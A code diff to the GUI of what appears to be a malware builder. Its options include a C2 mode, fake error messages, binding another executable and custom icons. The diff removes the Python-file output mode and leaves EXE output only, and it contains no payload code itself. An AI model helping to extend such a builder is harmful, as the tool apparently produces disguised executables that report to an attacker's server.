@@ -206,14 +206,11 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
 		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
 
-		self.buildModeButtonControl = ctk.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
-		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
-
 		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
-		self.consoleModeButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
+		self.consoleModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
 
 		self.buildButtonControl = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", text_color_disabled= "grey", command= self.buildButtonControl_Callback)
-		self.buildButtonControl.grid(row= 6, column= 5, sticky= "ew", padx= (0, 15))
+		self.buildButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
 
 	def C2ModeButtonControl_Callback(self) -> None:
 		self.focus() # Removes focus from the C2 text box
@@ -293,7 +290,6 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 	
 	def buildModeButtonControl_Callback(self) -> None:
 		EXEMODE = "Output: EXE File"
-		PYMODE = "Output:   PY File"
 
 		exeOnlyChecboxControls = (
 			(self.fakeErrorCheckboxControl, self.fakeErrorVar),
@@ -304,28 +300,11 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			(self.selectIconButtonControl, None),
 		)
 
-		if self.OutputAsExe: # Change to PY mode
-			self.OutputAsExe = False
-			buttonText = PYMODE
+		self.OutputAsExe = True
+		buttonText = EXEMODE
 
-			for control, var in exeOnlyChecboxControls:
-				control.configure(state= "disabled")
-				if var:
-					var.set(False)
-			self.fakeError_Event()
-			
-			if self.iconBytes:
-				self.selectIconButtonControl_Callback() # Remove icon
-			
-			if self.boundExePath:
-				self.bindExeButtonControl_Callback() # Remove bound executable
-
-		else: # Change to EXE mode
-			self.OutputAsExe = True
-			buttonText = EXEMODE
-
-			for control, _ in exeOnlyChecboxControls:
-				control.configure(state= "normal")
+		for control, _ in exeOnlyChecboxControls:
+			control.configure(state= "normal")
 
 		self.buildModeButtonControl.configure(text= buttonText)
 	
